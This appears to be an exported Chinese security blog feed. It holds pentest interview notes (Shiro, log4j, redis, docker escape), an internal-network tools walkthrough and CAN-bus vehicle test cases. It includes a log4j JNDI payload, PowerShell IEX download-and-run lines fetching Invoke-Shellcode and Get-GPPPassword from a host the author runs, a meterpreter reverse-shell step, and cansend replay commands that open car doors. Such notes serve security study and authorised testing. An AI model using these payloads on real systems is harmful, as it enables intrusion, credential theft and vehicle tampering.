Cookie的值</p><p>2.进行Base64解码</p><p>3.进行AES解码</p><p>4.进行反序列化操作</p><p>在第4步中的调用反序列化时未进行任何过滤，进而可以导致触发远程代码执行漏洞。(550：此时的AES密钥为硬编码，所以可以枚举或者直接用默认的)</p><p><strong>Shiro550 反序列化漏洞原理：</strong></p><p>RememberMe功能开启之后，会有Cookie 数据，Cookie 数据其实就是加密后的经过序列化的用户对象，也就是二进制字节流。加密算法是AES 算法，算法很安全，但是秘钥是固定的，并且存储于源码中。</p><p><strong>Shiro721 利用条件：</strong></p><p>AES 秘钥不在是固定的了，但是此秘钥可以被爆破</p><p>需要提供一个合法用户，再点击remmber me ，成功登录之后，获取Cookie remmber-me 的值。</p><p><strong>区别在于：</strong></p><p>Shiro-550，Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。Shiro-721，由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><h2 id="log4j反序列化"><a class="markdownIt-Anchor" href="#log4j反序列化"></a> log4j反序列化</h2><p>本次漏洞是因为Log4j2组件中 lookup功能的实现类 <code>JndiLookup</code> 的设计缺陷导致，可以使用： <code>$&#123;jndi:ldap://http://xxx.dnslog.cn&#125; </code></p><h2 id="redis漏洞如何getshell"><a class="markdownIt-Anchor" href="#redis漏洞如何getshell"></a> redis漏洞如何getshell</h2><ol><li>定时任务：<code>/var/spoon/cron.d</code></li><li>ssh公钥</li><li>写webshell：知道网站路径（在低权限也能使用）</li><li>主从复制</li></ol><h2 id="docker逃逸漏洞"><a class="markdownIt-Anchor" href="#docker逃逸漏洞"></a> docker逃逸漏洞</h2><p>判断是否为docker环境：</p><ol><li>cgroup信息：<code>cat /proc/1/cgroup</code></li><li>dockerenv文件：<code>ls -alh /.dockerenv</code></li></ol><p>常见逃逸方法：</p><ol><li>利用dirty cow来进行docker逃逸：<code>VDSO其实就是将内核中的.so文件映射到内存，.so是基于Linux下的动态链接,其功能和作用类似与windows下.dll文件。</code></li><li>cve-2019-5736</li><li>docker配置不当：<ul><li>特权模式：当管理员执行<code>docker run -privileged</code>时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载</li><li>docket remote api未授权访问导致逃逸</li></ul></li></ol><h2 id="thinkphp"><a class="markdownIt-Anchor" href="#thinkphp"></a> thinkphp</h2><p>5.0RCE漏洞</p><h2 id="drupal"><a class="markdownIt-Anchor" href="#drupal"></a> Drupal</h2><ol><li>常见远程代码执行</li><li>当拿到shell，但是不是www-data账户，可以更改账户</li><li>进入后台，可以使用添加拓展模块php-code，调用filter，然后添加base page，在这个页面写上我们的反弹shell或者其他webshell都可以</li></ol><h1 id="车联网测试"><a class="markdownIt-Anchor" href="#车联网测试"></a> 车联网测试</h1><h2 id="基础类"><a class="markdownIt-Anchor" href="#基础类"></a> 基础类</h2><h3 id="说说几种总线以及他们的作用"><a class="markdownIt-Anchor" href="#说说几种总线以及他们的作用"></a> 说说几种总线以及他们的作用？</h3><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230831195842819.png" alt="image-20230831195842819" /></p><p>分为CAN、LIN、FlexRay、MOST总线。</p><ul><li>CAN总线用于车辆通信，连接各路ECU，传讯方式为广播。其分为高压低压两条线，静止电压为2.5V，高低压偏移量为1V，引脚为2和7.</li><li>LIN总线是CAN总线的延申，它成本较低（速率比CAN低），连接一路ECU，传讯方式为主从式。电压为12V</li><li>FlexRay一般用于控制引擎控制/ABS/悬架控制/线控转向等，为周期通信方式</li><li>MOST为娱乐总线，是唤醒结构，只能朝一个方向前进</li><li>还有以太网。</li></ul><h3 id="can报文的组成部分"><a class="markdownIt-Anchor" href="#can报文的组成部分"></a> CAN报文的组成部分</h3><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230612104714733.png" alt="image-20230612104714733" /></p><p>包含几个部分：帧起始段（1），仲裁段（12），控制段（2）、数据段（4+8）、CRC段（16）、ACK段（2）、帧结束（3）</p><h3 id="uds服务有哪些"><a class="markdownIt-Anchor" href="#uds服务有哪些"></a> UDS服务有哪些</h3><p>UDS由ISO-14229定义，有六个大类，26种诊断服务。其中常用的是：</p><ol><li>10：进入编程会话模式、切换会话模式</li><li>11：ECU复位</li><li>19：读取故障码</li><li>22 / 23：通过 ID / 地址 读取数据</li><li>27：安全访问，获取密钥</li><li>31：例程控制。启动 / 停止ECU中的某个例程</li><li>34：用于下载数据到ECU中</li><li>35：从ECU中上传数据</li><li>36：传输数据块</li></ol><h2 id="测试类"><a class="markdownIt-Anchor" href="#测试类"></a> 测试类</h2><h3 id="有什么测试项"><a class="markdownIt-Anchor" href="#有什么测试项"></a> 有什么测试项</h3><ol><li>整车拓扑——核心零件：中央网关、T-Box、IVI</li><li>应用场景：V2V、V2I通信以及相关设备（云端）</li><li>数据安全：车辆状态、车辆行驶轨迹等</li></ol><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230831215459652.png" alt="image-20230831215459652" /></p><h3 id="wifi有什么攻击面"><a class="markdownIt-Anchor" href="#wifi有什么攻击面"></a> WIFI有什么攻击面</h3><ol><li>中断攻击</li><li>欺骗攻击</li></ol><h3 id="有什么攻击面"><a class="markdownIt-Anchor" href="#有什么攻击面"></a> 有什么攻击面</h3><ol><li>通过OBDII接口物理接入（还有USB/CD/MP3等接口）</li><li>通过蓝牙、WIFI等短距离接入（还有）</li><li>通过GSM远程接入</li></ol><h3 id="如何对车载系统进行端口扫描-漏洞扫描和嗅探分析"><a class="markdownIt-Anchor" href="#如何对车载系统进行端口扫描-漏洞扫描和嗅探分析"></a> 如何对车载系统进行端口扫描、漏洞扫描和嗅探分析？</h3><ol><li>通过CANoe/USBCAN等工具连接OBDII，然后使用对应的软件进行攻击，例如</li><li></li></ol><h3 id="通过obd-ii调试接口有什么测试can的项目如何测试"><a class="markdownIt-Anchor" href="#通过obd-ii调试接口有什么测试can的项目如何测试"></a> 通过OBD-II调试接口，有什么测试CAN的项目，如何测试？</h3><h3 id="测试ivi的流程"><a class="markdownIt-Anchor" href="#测试ivi的流程"></a> 测试IVI的流程</h3><h3 id="使用can刷写ecu和使用obd刷写ecu的不同刷写流程如何"><a class="markdownIt-Anchor" href="#使用can刷写ecu和使用obd刷写ecu的不同刷写流程如何"></a> 使用CAN刷写ECU和使用OBD刷写ECU的不同？刷写流程如何？</h3><p>OBD只能刷写车辆主要模块，例如ECM发动机控制模块、TCM变速箱控制模块等，而CAN总线刷写可以写任何模块。还有接口啥的，速度啥的也不同</p><p><strong>流程为：</strong></p><ul><li><strong>唤醒ECU</strong>：通过发送特定的报文或信号，使ECU从正常模式切换到bootloader模式，等待刷写命令。</li><li><strong>读取ECU信息</strong>：通过发送诊断服务（如22服务），读取ECU的硬件版本号、软件识别号、零件号等信息，以确定是否需要刷写。</li><li><strong>擦除存储器</strong>：通过发送诊断服务（如31服务），擦除ECU存储器中原有的application程序，为新程序腾出空间。</li><li><strong>下载程序</strong>：通过发送诊断服务（如34、36、37服务），将新程序分段传输到ECU存储器中，每段传输后进行校验和比对，确保数据正确无误。</li><li><strong>重启ECU</strong>：通过发送诊断服务（如11服务），使ECU重启并运行新程序，完成刷写过程。</li></ul><h3 id="uds刷写流程"><a class="markdownIt-Anchor" href="#uds刷写流程"></a> UDS刷写流程</h3><p>UDS刷写流程是基于ISO14229协议定义的一种ECU软件升级方法，它主要包括以下几个步骤：</p><ul><li>进入<strong>编程会话模式</strong>（<code>$10</code>），并请求<strong>种子和钥匙</strong>（<code>$27</code>）进行ECU解锁，获得读写权限。</li><li>请求<strong>例程控制</strong>（<code>$31</code>），执行刷写前的准备工作，如擦除内存、关闭报文等。</li><li>请求<strong>下载</strong>（<code>$34</code>），发送刷写数据的元信息，如地址、长度、压缩方式等。</li><li>进行<strong>数据传输</strong>（<code>$36</code>），分段发送刷写数据，每段数据后接收ECU的响应。</li><li>请求<strong>例程控制</strong>（<code>$31</code>），执行刷写后的操作，如校验、重启等。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基础知识&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基础知识&quot;&gt;&lt;/a&gt; 基础知识&lt;/h1&gt;
&lt;h2 id=&quot;数据结构与算法&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#数据结构与算法&quot;&gt;&lt;/a&gt; 数据</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>内网安全（三）——工具实验版</title>
    <link href="https://j3f5.github.io/articles/2023/08/08/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%AA%8C%E7%89%88/"/>
    <id>https://j3f5.github.io/articles/2023/08/08/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%AA%8C%E7%89%88/</id>
    <published>2023-08-08T14:05:05.000Z</published>
    <updated>2023-08-08T14:05:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="说明"><a class="markdownIt-Anchor" href="#说明"></a> 说明</h1><h1 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h1><h2 id="扫描网络"><a class="markdownIt-Anchor" href="#扫描网络"></a> 扫描网络</h2><p>主要是发现网络中的主机。</p><h3 id="cme工具"><a class="markdownIt-Anchor" href="#cme工具"></a> CME工具</h3><p>此工具为crackmapexec，链接：<a href="https://github.com/Porchetta-Industries/CrackMapExec">https://github.com/Porchetta-Industries/CrackMapExec</a></p><p>通过SMB发现主机（NetBIOS）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo crackmapexec smb 192.168.52.1/24</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%AA%8C%E7%89%88/image-20230808220717638.png" alt="image-20230808220717638" /></p><h3 id="nmap工具"><a class="markdownIt-Anchor" href="#nmap工具"></a> nmap工具</h3><h4 id="快速扫描"><a class="markdownIt-Anchor" href="#快速扫描"></a> 快速扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -PN -sV --top-ports 50 --open 192.168.52.30</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%AA%8C%E7%89%88/image-20230808221841094.png" alt="image-20230808221841094" /></p><h4 id="扫描漏洞smb"><a class="markdownIt-Anchor" href="#扫描漏洞smb"></a> 扫描漏洞(SMB)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PN --script smb-vuln* -p139,445 192.168.52.30</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%AA%8C%E7%89%88/image-20230808222501161.png" alt="image-20230808222501161" /></p><h3 id="fscan"><a class="markdownIt-Anchor" href="#fscan"></a> fscan</h3><blockquote><p><a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><ol><li><p>信息搜集: 存活探测(icmp)、端口扫描</p></li><li><p>爆破功能: 各类服务爆破(ssh、smb、rdp等)、数据库密码爆破(mysql、mssql、redis、psql、oracle等)</p></li><li><p>系统信息、漏洞扫描: netbios探测、域控识别、获取目标网卡信息、高危漏洞扫描(ms17010等)</p></li><li><p>Web探测功能: webtitle探测、web指纹识别(常见cms、oa框架等)、web漏洞扫描(weblogic、st2等,支持xray的poc)</p></li><li><p>漏洞利用: redis写公钥或写计划任务、ssh命令执行、ms17017利用(植入shellcode),如添加用户等</p></li><li><p>其他功能:、文件保存</p></li></ol></blockquote><p>上传到受害机，然后执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 192.168.1.1/24</span><br></pre></td></tr></table></figure><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%AA%8C%E7%89%88/image-20230809104743160.png" alt="image-20230809104743160" style="zoom:33%;" /><h3 id="adfind"><a class="markdownIt-Anchor" href="#adfind"></a> adfind</h3><p>下载地址：<a href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml</a></p><p>功能：域内信息搜集</p><ul><li>域控名</li><li>域控主机</li><li>域内在线主机及所有属性</li><li>域内用户</li><li>查询域内所有GPO信息</li><li>查询约束委派用户</li></ul><p><a href="https://blog.csdn.net/weixin_43571641/article/details/124263803">https://blog.csdn.net/weixin_43571641/article/details/124263803</a></p><h3 id="ldapsearch"><a class="markdownIt-Anchor" href="#ldapsearch"></a> ldapsearch</h3><p>这个工具可以帮助我们查找：</p><ul><li>LDAP用户</li></ul><h3 id=""><a class="markdownIt-Anchor" href="#"></a> </h3><h1 id="框架工具"><a class="markdownIt-Anchor" href="#框架工具"></a> 框架工具</h1><h2 id="powershell-powersploit"><a class="markdownIt-Anchor" href="#powershell-powersploit"></a> Powershell Powersploit</h2><p>使用工具有几个问题：</p><ol><li>怎么连接并运行</li><li>无文件落地的运行是使用什么来加载</li><li>一般使用什么命令</li></ol><h3 id="基本"><a class="markdownIt-Anchor" href="#基本"></a> 基本</h3><p>刚开始使用POWERSHELL的时候，它会有限制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Get-ExecutionPolicy</span><br><span class="line"># return </span><br><span class="line">Restricted #这个设置是不允许任何脚本运行</span><br><span class="line">RemoteSigned #运行本地脚本不需要数字签名，但是从网上下载的需要</span><br><span class="line">Unrestricted #允许运行所有脚本，但是运行前会提示</span><br><span class="line">Bypass #所有都允许且不提示</span><br></pre></td></tr></table></figure><p>破解限制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-ExucutionPolicy unrestricted</span><br><span class="line"># 临时破解</span><br><span class="line">powershell -ExecutionPolicy Bypass -File &quot;你的脚本路径.ps1&quot;</span><br></pre></td></tr></table></figure><p>我的运行是：先上传普通的meterpreter反弹shell，然后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load powershell</span><br><span class="line">meterpreter &gt; powershell_execute Get-ExecutionPolicy</span><br><span class="line">[+] Command execution completed:</span><br><span class="line">Unrestricted</span><br></pre></td></tr></table></figure><p>接下来就是：</p><ol><li><p>我们开启apache服务，把我们的文件挂上去：<code>sudo service apache2 start</code></p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%AA%8C%E7%89%88/image-20230814105914495.png" alt="image-20230814105914495" style="zoom:25%;" /></li><li><p>启动下载（IEX）&amp;调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   IEX（New-Object Net.Webclient).DownloadString(&quot;http://10.131.210.172/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;)</span><br><span class="line">   IEX（New-Object Net.Webclient).DownloadString(&quot;http://10.131.210.172/PowerSploit/Recon/Invoke-Portscan.ps1&quot;)</span><br><span class="line">   </span><br><span class="line">IEX（New-Object Net.Webclient).DownloadString(&quot;http://10.131.210.172/PowerSploit/Recon/Invoke-Portscan.ps1&quot;)</span><br><span class="line">   iex(New-Object Net.WebClient).DownloadString(&quot;http://10.131.210.172/PowerSploit/Exfiltration/Get-GPPPassword.ps1&quot;)</span><br></pre></td></tr></table></figure></li></ol><h3 id="msf-load-powershell"><a class="markdownIt-Anchor" href="#msf-load-powershell"></a> msf load powershell</h3><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; load powershell</span><br><span class="line">meterpreter &gt; powershell_</span><br><span class="line">powershell_execute         powershell_import          powershell_session_remove  powershell_shell</span><br></pre></td></tr></table></figure><p>这几个模块基本可以满足运行了！直接用就可以</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;说明&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#说明&quot;&gt;&lt;/a&gt; 说明&lt;/h1&gt;
&lt;h1 id=&quot;信息搜集&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#信息搜集&quot;&gt;&lt;/a&gt; 信息搜集&lt;/h1&gt;
&lt;h2 </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CAN总线测试样例</title>
    <link href="https://j3f5.github.io/articles/2023/08/03/CAN%E6%80%BB%E7%BA%BF%E6%B5%8B%E8%AF%95%E6%A0%B7%E4%BE%8B/"/>
    <id>https://j3f5.github.io/articles/2023/08/03/CAN%E6%80%BB%E7%BA%BF%E6%B5%8B%E8%AF%95%E6%A0%B7%E4%BE%8B/</id>
    <published>2023-08-03T01:37:43.000Z</published>
    <updated>2023-08-03T01:37:43.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="can重放逆向"><a class="markdownIt-Anchor" href="#can重放逆向"></a> CAN重放（逆向）</h1><h2 id="测试内容"><a class="markdownIt-Anchor" href="#测试内容"></a> 测试内容</h2><p>由于CAN总线网络通信是广播通信，通过工具按时序截获车辆数据，并且通过二分法等方法来识别控制相应ECU的数据帧ID，并通过在CAN总线网络上重新注入这些数据帧，达到干扰和非法控制某一个或多个ECU的目的。</p><h2 id="测试初始条件"><a class="markdownIt-Anchor" href="#测试初始条件"></a> 测试初始条件</h2><p>已安装能捕获CAN总线数据帧的软件，有相关数据传输的文档。</p><h2 id="项目步骤"><a class="markdownIt-Anchor" href="#项目步骤"></a> 项目步骤</h2><ol><li><p>通过工具对CAN总线中的数据进行录制操作；</p><p>例如用candump录制：<code>candump can0 -l</code></p><p><img src="/../../Mywork/Note/images/CAN%25E6%25B5%258B%25E8%25AF%2595/image-20230718091144778.png" alt="image-20230718091144778" /></p></li><li><p>使用工具重放已录制的CAN总线数据包，可以通过二分法/八分法等方法快速定位ECU相关数据帧</p><p><strong>定位</strong>：<code>cc.py fuzzer identify can.log</code></p><blockquote><p>注意：cc.py识别的数据帧只是后半段，我们需要对数据进行处理：<code>cat candump-2023-07-17_144128.log | awk '&#123;print $3&#125;'</code>（只要第三段）</p><p>观察汽车的特征，选择y/n（二分法）来定位包。此时我观察到，当包发生在有100#的特权马的时候，他就会出现<strong>闪灯</strong>、<strong>车门锁发出声响</strong>等迹象，则判断此为我们想要的包。</p></blockquote></li><li><p>重放捕获的数据帧，验证是否能触发ECU的状态改变</p><p><strong>重放验证</strong>：<code>cansend can0 010#053509a87f088000 </code></p><blockquote><p>注意：此时发送一个包只会让车门开一会，我们需要发送3个包以上，才能保证车门完全开启</p></blockquote><p><strong>重放验证2</strong>：<code>canplayer</code></p><blockquote><p>注意：此版完成后，发现完成开关车门需要好几个包同时配合：</p><ol><li>开门锁</li><li>闪灯（这个是和开门锁同时的，测不出来包）</li><li>镜头转向</li></ol></blockquote></li></ol><h2 id="结果"><a class="markdownIt-Anchor" href="#结果"></a> 结果</h2><h3 id="预期"><a class="markdownIt-Anchor" href="#预期"></a> 预期</h3><p>发现控制ECU的关键数据帧，重放之可以控制改ECU。</p><h3 id="实际"><a class="markdownIt-Anchor" href="#实际"></a> 实际</h3><p>发送一个包只会让车门开一会，我们需要发送3个包以上，才能保证车门完全开启。</p><h1 id="can-fuzz"><a class="markdownIt-Anchor" href="#can-fuzz"></a> CAN-FUZZ</h1><h2 id="测试内容-2"><a class="markdownIt-Anchor" href="#测试内容-2"></a> 测试内容</h2><p>通过工具对CAN总线控制ECU的数据帧进行模糊测试，从而发现控制相关ECU的关键数据帧。</p><h2 id="测试初始条件-2"><a class="markdownIt-Anchor" href="#测试初始条件-2"></a> 测试初始条件</h2><p>已安装能捕获CAN总线数据帧的软件。</p><h2 id="项目步骤-2"><a class="markdownIt-Anchor" href="#项目步骤-2"></a> 项目步骤</h2><ol><li>使用工具根据时序对CAN总线发送大量递增的数据帧</li><li>在此过程中，如果车辆相关ECU状态发生变化，则暂停，并且重放该段数据帧，使用二分法查找对应关键数据帧</li></ol><h2 id="结果-2"><a class="markdownIt-Anchor" href="#结果-2"></a> 结果</h2><h3 id="预期-2"><a class="markdownIt-Anchor" href="#预期-2"></a> 预期</h3><p>能够发现控制各个ECU部件的相关数据帧</p><h3 id="实际-2"><a class="markdownIt-Anchor" href="#实际-2"></a> 实际</h3><p>通过大量数据帧的发送，能够发现一些ECU一闪而逝的状态变化。查找关键数据帧的过程比较漫长</p><h1 id="can总线数据篡改攻击can总线数据欺骗攻击"><a class="markdownIt-Anchor" href="#can总线数据篡改攻击can总线数据欺骗攻击"></a> CAN总线数据篡改攻击/CAN总线数据欺骗攻击</h1><h2 id="测试内容-3"><a class="markdownIt-Anchor" href="#测试内容-3"></a> 测试内容</h2><p>攻击者通过截获CAN总线上的有效数据帧，甚至可以伪造这些有效的CAN数据帧，并将其重新发送到总线上，以模拟合法节点操作对车辆的某些功能进行欺骗，或改变车辆的行为或者性能。</p><h2 id="测试初始条件-3"><a class="markdownIt-Anchor" href="#测试初始条件-3"></a> 测试初始条件</h2><p>已安装能捕获CAN总线数据帧的软件。</p><h2 id="项目步骤-3"><a class="markdownIt-Anchor" href="#项目步骤-3"></a> 项目步骤</h2><ol><li>使用工具捕获CAN总线上的数据帧，并观察与找出那些是控制ECU的关键数据帧</li><li>保存记录这些关键数据帧，重复发送原数据帧或将在线数据帧篡改成恶意数据帧来欺骗或者修改其状态。</li></ol><h2 id="结果-3"><a class="markdownIt-Anchor" href="#结果-3"></a> 结果</h2><h3 id="预期-3"><a class="markdownIt-Anchor" href="#预期-3"></a> 预期</h3><p>截获速度提升的数据帧，修改普通数据帧为该数据帧，并放行，仪表盘的速度指针变快</p><h1 id="can网关测试"><a class="markdownIt-Anchor" href="#can网关测试"></a> CAN网关测试</h1><h2 id="测试内容-4"><a class="markdownIt-Anchor" href="#测试内容-4"></a> 测试内容</h2><h3 id="数据帧健康异常测试"><a class="markdownIt-Anchor" href="#数据帧健康异常测试"></a> 数据帧健康/异常测试</h3><ul><li>网关宜根据通信矩阵中的信号定义，对数据帧中的信号值进行检查，检查内容包括信号值长度、信号值有效性等；</li><li>网关宜具有数据帧异常检测功能，即检查和记录数据帧之间发送与接收关系的机制。</li></ul><h2 id="测试初始条件-4"><a class="markdownIt-Anchor" href="#测试初始条件-4"></a> 测试初始条件</h2><h2 id="项目步骤-4"><a class="markdownIt-Anchor" href="#项目步骤-4"></a> 项目步骤</h2><ul><li>检测设备对网关发送一个或多个信号长度不符合通信矩阵定义的数据帧，在指定的目的端口检测接收到的数据帧，并收集样件日志；</li><li>检测设备对网关发送一个或多个信号值不符合通信矩阵定义的数据帧，在指定的目的端口检测接收到的数据帧，并收集样件日志；</li></ul><h2 id="结果-4"><a class="markdownIt-Anchor" href="#结果-4"></a> 结果</h2><p>正确检查了数据帧信号值的长度与有效性等参数，对异常的数据帧，都会被记录到相关的样件日志中。</p><h1 id="uds服务发现"><a class="markdownIt-Anchor" href="#uds服务发现"></a> UDS服务发现</h1><h2 id="测试内容-5"><a class="markdownIt-Anchor" href="#测试内容-5"></a> 测试内容</h2><p>发现所有UDS会话，从而发现相应的ECU ID，枚举该ECU的所有服务和子服务，从而发现ECU中可能出现的弱点。由于UDS规定的SID只有一个字节，因此只需要遍历00-FF，参数部分可以适当随机一两个字节。 例如遍历 <code>03 【00-FF】 01 01</code>，有+0x40的响应就说明ECU支持该服务。</p><h2 id="测试初始条件-5"><a class="markdownIt-Anchor" href="#测试初始条件-5"></a> 测试初始条件</h2><h2 id="项目步骤-5"><a class="markdownIt-Anchor" href="#项目步骤-5"></a> 项目步骤</h2><ol><li><p>使用不同会话（<code>02 10 01/02/03</code>）联系ECU，观察其反应，如果有响应，则为存在该ECU，记录该ID。具体而言，我们可以使用工具发现会话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">─# cc.py uds discovery                     </span><br><span class="line">+------------+------------+</span><br><span class="line">| CLIENT ID  | SERVER ID  |</span><br><span class="line">+------------+------------+</span><br><span class="line">| 0x00000733 | 0x00000633 |</span><br><span class="line">| 0x000007df | 0x000007f9 |</span><br><span class="line">| 0x000007f1 | 0x000007f9 |</span><br><span class="line">| 0x000007ff | 0x00000633 |</span><br><span class="line">+------------+------------+</span><br></pre></td></tr></table></figure></li><li><p>枚举会话的相关服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─# cc.py uds services 0x733 0x633</span><br><span class="line">Supported service 0x10: DIAGNOSTIC_SESSION_CONTROL</span><br><span class="line">Supported service 0x11: ECU_RESET</span><br><span class="line">Supported service 0x14: CLEAR_DIAGNOSTIC_INFORMATION</span><br><span class="line">Supported service 0x19: READ_DTC_INFORMATION</span><br><span class="line">Supported service 0x22: READ_DATA_BY_IDENTIFIER</span><br><span class="line">Supported service 0x23: READ_MEMORY_BY_ADDRESS</span><br><span class="line">Supported service 0x2a: READ_DATA_BY_PERIODIC_IDENTIFIER</span><br><span class="line">Supported service 0x2c: DYNAMICALLY_DEFINE_DATA_IDENTIFIER</span><br><span class="line">Supported service 0x2f: INPUT_OUTPUT_CONTROL_BY_IDENTIFIER</span><br><span class="line">Supported service 0x31: ROUTINE_CONTROL</span><br><span class="line">Supported service 0x3e: TESTER_PRESENT</span><br><span class="line">Supported service 0xaf: Unknown service</span><br></pre></td></tr></table></figure></li></ol><h2 id="结果-5"><a class="markdownIt-Anchor" href="#结果-5"></a> 结果</h2><p>发现相关服务，可以进一步构建威胁模型，对汽车进行进一步攻击。</p><h1 id="ecu-复位与-sessions切换安全"><a class="markdownIt-Anchor" href="#ecu-复位与-sessions切换安全"></a> ECU 复位与 Sessions切换安全</h1><h2 id="测试内容-6"><a class="markdownIt-Anchor" href="#测试内容-6"></a> 测试内容</h2><p>在车辆行驶时，要求ECU不应该响应特定的会话切换命令（<code>02 10 02</code>），并且不应该出现进入编程模式后无法恢复到普通模式的情况。此时，在汽车车辆静止、车辆低速行驶、车辆高速行驶、车辆低电量、车辆远程等工况中随机发送切换会话的指令（<code>02 10 02/03</code>），和复位会话指令（<code>02 11 01/02/03</code>），观察其会话的变化，评估车辆内部ECU在不同工况和会话模式下的稳定性和响应能力。</p><h2 id="测试初始条件-6"><a class="markdownIt-Anchor" href="#测试初始条件-6"></a> 测试初始条件</h2><h2 id="项目步骤-6"><a class="markdownIt-Anchor" href="#项目步骤-6"></a> 项目步骤</h2><ol><li><strong>不同工况选择：</strong> 测试会在不同的车辆工况下进行，包括：<ul><li>车辆静止</li><li>车辆低速行驶</li><li>车辆高速行驶</li><li>车辆升级（可能指软件或固件升级）</li></ul></li><li><strong>随机发送指令：</strong> 在每个工况下，会随机选择发送以下三种会话切换请求消息：<ul><li>02 10 01</li><li>02 10 02</li><li>02 10 03</li></ul></li><li><strong>观察响应情况：</strong> 在每个工况下，观察并记录车辆内部的ECU对发送的指令的响应情况。</li><li><strong>发送复位指令</strong>：在不同会话、不同工况下，发送复位命令后，记录车辆的响应和表现。这可以包括车辆是否重新启动、恢复正常模式等情况。指令为：<ul><li>02 11 01</li><li>02 11 02</li><li>02 11 03</li></ul></li></ol><h2 id="结果-6"><a class="markdownIt-Anchor" href="#结果-6"></a> 结果</h2><p>汽车在行驶过程中可以对ECU会话进行复位，并且不会响应特定的会话切换命令。在复位后，车辆没有重新启动。</p><p>而没有行驶时，车辆重启：</p><p><img 